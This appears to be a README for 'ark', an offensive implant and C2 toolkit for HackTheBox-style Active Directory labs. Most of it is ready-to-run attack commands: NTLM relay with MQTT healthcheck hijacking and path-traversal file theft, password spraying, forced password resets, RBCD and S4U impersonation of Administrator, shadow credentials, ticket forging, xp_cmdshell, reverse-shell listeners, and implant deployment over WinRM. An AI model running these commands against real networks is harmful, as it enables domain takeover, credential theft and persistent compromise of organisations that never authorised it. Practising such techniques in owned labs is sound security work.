# Operator pre-implant toolkit (lab)

Authorized **HTB / owned lab** helpers that run **without** a C2 session or teamserver.

**Inbound C2 / firewall / auth logs / reverse tunnel:** `ark inbound` · `docs/OPERATOR_INBOUND.md`.

| Command | Purpose |
| --- | --- |
| `ark inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel / TCP redirector |
| `ark ldap …` | Host-side LDAPS bind / enum / enable-disable / spray / dangling ADCS template names |
| `ark smb …` | Host-side SMB shares / ls / get (NTLM or `--ticket` native Kerberos; `--anon` is Guest; Impacket wrap: `ARK_SMB_IMPACKET=1`) |
| `ark adcs …` | Dangling ESC1 template create / grant / WCCE req / auto. Then `ark kerberos pkinit --pfx` |
| `ark rbcd …` | Host-side RBCD write / clear / show |
| `ark kerberos …` | Skew, AES asktgt (or `--hash` NT overpass), S4U, keylist, golden/silver, ticket import, PKINIT UnPAC (`pkinit --pfx`) |
| `ark ad password …` | ForceChangePassword via LDAPS `unicodePwd`, then native SAMR |
| `ark ad add-computer …` | LDAP Add, then native SAMR on `WILL_NOT_PERFORM` |
| `ark ad prp …` | RODC PRP: clear NeverReveal / add RevealOnDemand |
| `ark ad shadow auto …` | KeyCredentialLink write + PFX |
| `ark winrm …` | Host-side PSRP (pypsrp; needs repo `scripts/` or `ARK_ROOT`) |
| `ark http …` | Host-side HTTP GET/POST with NTLM (`--insecure` for lab TLS) |
| `ark dns …` | Host-side ADIDNS add/delete A records (LDAP; `--forest` for ForestDnsZones) |
| `ark mssql …` | Host-side MSSQL query / xp_cmdshell (impacket; SOCKS) |
| `ark mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
| `ark relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |

Also available as operator REPL commands `ldap` / `host-smb` / `ad` / `mqtt` / `relay` (same code path). Implant `smb` / `ldap-enum` still need `use <session>`.

## Unprivileged ports (rootless)

Default: **refuse listen ports &lt; 1024**.

```bash
# Good
ark relay http start --listen 10.10.14.15:8888 --target http://app.lab.htb/

# Override (needs CAP_NET_BIND_SERVICE / root)
ARK_ALLOW_PRIV_PORTS=1 ark relay http start --listen 0.0.0.0:80 --target http://app.lab.htb/ --allow-priv-ports
```

Many HTB coerces (WebDAV `@port`, PowerShell) work on **high HTTP ports**. Classic SMB coerce still wants **445** — use sudo or pivot.

## Fedora firewalld

Inbound from HTB VPN to your `tun0` high ports may be blocked:

```bash
firewall-cmd --add-port=8888/tcp
firewall-cmd --add-port=4444/tcp   # reverse shells
# or trust the tunnel interface (careful):
# firewall-cmd --zone=trusted --add-interface=tun0
```

## Ghostlink-style recipe

```bash
# Terminal A — NTLM relay (sticky TCP + held session for LFI)
ark relay http start \
  --listen 10.10.14.15:8888 \
  --target http://gpz-op26-secure.ghostlink.htb/ \
  --kernel-auth

# Terminal B — coerce via MQTT healthcheck
ark mqtt healthcheck-hijack --host 10.129.x.x \
  --topic GhostProtocolZero/systems/node/secureshare/healthcheck \
  --url http://10.10.14.15:8888

# After SUCCEED log line:
ark relay http sessions
ark relay http get --session 1 --double-encode \
  --path '..\..\..\..\..\..\..\windows\win.ini' \
  --out loot/win.ini
```

**Relay hardening (post code-review):**
- Sticky single TCP connection for Type1→Type3→subsequent GETs (connection-oriented NTLM)
- Control API defaults to **127.0.0.1 only**; refuse `0.0.0.0` unless `--api-allow-remote`
- Stale `~/.ark/relay/control.json` cleared on stop / dead PID
- Authorization never forwarded on redirects
- Double-encode matches Python `quote(quote(path, safe=""), safe="")` (dots + backslashes)

**Hosts:** map internal vhosts to the DC IP in `/etc/hosts` (or bwrap/docker `--add-host`).

**Clock skew:** Ghostlink DC was ~8h ahead; DanglingTree +7h.

```bash
ark kerberos skew --dc 10.129.x.x
ark kerberos with-skew --dc 10.129.x.x -- certipy auth -pfx administrator.pfx -dc-ip 10.129.x.x
```

`with-skew` needs libfaketime (`ARK_FAKETIME_SO` or `/usr/lib64/libfaketime.so.1`).

## Host-side AD (no implant)

DanglingTree-class boxes often have creds long before WinRM/RDP. Prefer files for secrets (`--pass-file`).

```bash
ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl --sam m.carter
ark ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass
ark ldap set --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob scriptPath loot.bat --yes
ark ldap enable --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob --yes
ark ldap spray --dc 10.129.x.x --domain danglingtree.htb --user-file ./users.txt --pass-file ./p --delay 2s --yes
ark ad add-computer --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name ATTACK --out ./mach.pass --yes
ark rbcd write --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$ --from ATTACK$ --yes
ark rbcd show  --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$
ark kerberos s4u --dc 10.129.x.x --domain danglingtree.htb --user ATTACK$ --pass-file ./mach.pass \
  --impersonate Administrator --spn cifs/dc.danglingtree.htb
ark ad shadow auto --dc 10.129.x.x --domain danglingtree.htb --user U --hash NT --target SAM --out t.pfx --yes
ark ad dmsa create --dc DC --domain D --user U --hash NT --name pwn --ou "OU=X,DC=d,DC=htb" --target victim --yes
ark winrm --host H --user U --domain D --hash-file nt.txt --ps "whoami"
# winrm/mssql wrap scripts/ from a checkout. Installed ~/.local/bin/ark needs:
#   export ARK_ROOT=/path/to/ARK
eval "$(ark inbound env --port 1080)"
ark mssql query --host 172.16.0.11 --user U --pass-file P --windows --sql "SELECT SYSTEM_USER"
# SOCKS is applied (PySocks). --host is the inner SQL IP. Password stays in --pass-file (not argv).
ark kerberos asktgt --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p
ark kerberos ticket import ./admin.ccache
ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --ticket <id>
ark smb ls --host 10.129.x.x --hostname dc.danglingtree.htb --share C$ --ticket <id>
ark http get --url https://10.129.x.x/ --user U --pass-file ./p --domain danglingtree.htb --insecure
ark dns add --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name testdns --type A --data 10.10.14.1 --yes
ark kerberos keylist --dc 10.129.x.x --domain danglingtree.htb \
  --user Administrator --rodc-no N --aes-file ./rodc.aes

ark smb shares --host 10.129.x.x --anon   # Guest session; signing-required DCs reject Guest
ark smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf

# ForceChangePassword (do not put the sAM prefix in the new password)
ark ad password --dc 10.129.x.x --domain danglingtree.htb \
  --user alex.o --pass-file ./alex.pass --target jake.h --new-pass-file ./jake.new --yes
```

LDAPS is tried first so DCs that return `strongerAuthRequired` on unsigned 389 still work.

## Soft path after domain user

Once you have `nvirelli` / Admin (or similar):

```bash
ark op lateral winrm <IP> "whoami" --user U --domain D --pass-file ./pass.txt
# or --hash <NT>
python3 scripts/deploy_winrm.py --host <IP> --user U --domain D --pass-file ./pass.txt --implant build/implant.exe
```

Prefer soft compromise; skip LSASS unless the objective requires it.

## Linux pivot (C implant first)

After a Linux foothold (e.g. Gogs RCE / web RCE):

1. **Prefer C Linux implant** (`make implant-c-linux` + CA pin).
2. If the host cannot reach operator VPN: `ark inbound drop user@TARGET` (tunnel + generate; do not bare-make).
3. Exercise shell / file / process from the C session (product QA).
4. **Pivot:** C reverse SOCKS (`socks start`) is implemented — lab-prove on session (M4c live). Fallback: reverse tunnel / Ligolo / Go with justification.
5. External chisel is fine for speed; document intended path as **C implant** for framework QA.

See `docs/plans/SPRINT_L_C_LINUX.md` and `docs/C_IMPLANT_LAB_CHECKLIST.md` §6.

## Security

Lab-only offensive helpers. See `SECURITY.md`. Do not point listeners at unauthorized networks.
